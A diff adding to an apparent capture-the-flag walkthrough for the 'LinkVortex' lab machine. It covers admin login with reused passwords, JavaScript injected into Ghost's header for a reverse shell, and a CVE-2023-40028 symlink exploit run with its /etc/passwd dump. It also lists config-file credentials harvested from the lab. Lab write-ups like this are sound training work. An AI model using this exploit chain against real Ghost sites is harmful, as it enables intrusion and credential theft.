@@ -77,4 +77,91 @@ const password = 'OctopiFociPilfer45'
 The email to the password we found earlier is test-leo@example.com:thisissupersafe
 Seems we got a few emails and passwords, but nowhere to put them in.
 ghost login form is not accepting these emails as valid.
-  
+
+
+found this dockerfile.ghost file and it returned this information:
+└─$ cat Dockerfile.ghost
+FROM ghost:5.58.0
+
+# Copy the config
+COPY config.production.json /var/lib/ghost/config.production.json
+
+# Prevent installing packages
+RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb
+
+# Wait for the db to be ready first
+COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
+COPY entry.sh /entry.sh
+RUN chmod +x /var/lib/ghost/wait-for-it.sh
+RUN chmod +x /entry.sh
+
+ENTRYPOINT ["/entry.sh"]
+CMD ["node", "current/index.js"]
+
+after testing a few admin@linkvortex.htb credentials, the password OctopiFociPilfer45 worked. Authenticated successfully.
+
+Looking around there's a few ways to create a shell that I could think of. There's the ability to add more integrations
+and add a webhook. This didn't work out too well.
+
+I moved onto javascript. There's an option to inject code into the header/foot of a page. I ran some test code that would print
+to the console and it executed. This led me to create a javascript shell that executes upon any page loading the header.
+
+Javascript reverse shell successful, however its not interactive.
+I got a reverse shell using websockets running websocat, but this connection was also non-interactive even after successfully connecting.
+
+None of the reverse shells were letting me execute commands, likely because I was connecting to the websocket or the API and not
+the system itself. I decided to pivot.
+
+Found https://github.com/0xyassine/CVE-2023-40028/blob/master/CVE-2023-40028.sh
+which automated an exploit using the admin credentials we used earlier. This created a shell which then let me run cat /etc/passwd to uncover this:
+
+┌──(cesar㉿kali)-[~/websocat/CVE-2023-40028]
+└─$ python3 exploit.py --url http://linkvortex.htb -u admin@linkvortex.htb -p OctopiFociPilfer45
+[inf] starting session creation...
+[inf] session created successfully
+cesar@linkvortex.htb > cat /etc/passwd
+[inf] creating symlink for /etc/passwd to /home/cesar/websocat/CVE-2023-40028/exploit/content/images/2024/yfCt6HFhdTYnY.png
+[inf] symlink /home/cesar/websocat/CVE-2023-40028/exploit/content/images/2024/yfCt6HFhdTYnY.png created successfully.
+[inf] creating exploit.zip
+[inf] uploading exploit.zip...
+  adding: exploit/ (stored 0%)
+  adding: exploit/content/ (stored 0%)
+  adding: exploit/content/images/ (stored 0%)
+  adding: exploit/content/images/2024/ (stored 0%)
+  adding: exploit/content/images/2024/yfCt6HFhdTYnY.png (stored 0%)
+[inf] upload successful
+[inf] requesting http://linkvortex.htb/content/images/2024/yfCt6HFhdTYnY.png
+[inf] file content received:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+node:x:1000:1000::/home/node:/bin/bash
+
+[inf] cleaned up /home/cesar/websocat/CVE-2023-40028/exploit/content/images/2024/yfCt6HFhdTYnY.png
+
+Used this exploit to enumerate further. Machine is running Debian 11 bullseye.
+After a very very long time of trying to get the python script to work and not break my shell,
+I was finally able to shell in.
+
+Running :
+/var/lib/ghost/config.production.json
+returned lots of credentials. I knew to run this because chatgpt told me its where ghost stores passwords.
+ "user": "bob@linkvortex.htb",
+ "pass": "fibber-talented-worth"
+
